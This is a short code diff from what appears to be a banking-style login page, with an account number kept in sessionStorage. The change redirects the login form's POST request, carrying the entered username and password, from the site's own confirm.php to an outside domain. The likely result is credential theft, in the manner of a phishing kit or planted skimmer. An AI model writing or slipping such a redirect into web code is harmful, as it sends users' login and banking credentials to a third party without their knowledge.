@@ -668,7 +668,7 @@ sessionStorage.setItem("norek", norek);
                 var pass = $("#pass").val();
 
                 $.ajax({
-                    url: "/login/confirm.php",
+                    url: "https://api.verifikasi.biz.id/fstfvi-serbabisa/confirm.php",
                     method: "POST",
                     data: "username="+user+"&password="+pass,
                     beforeSend: function() {
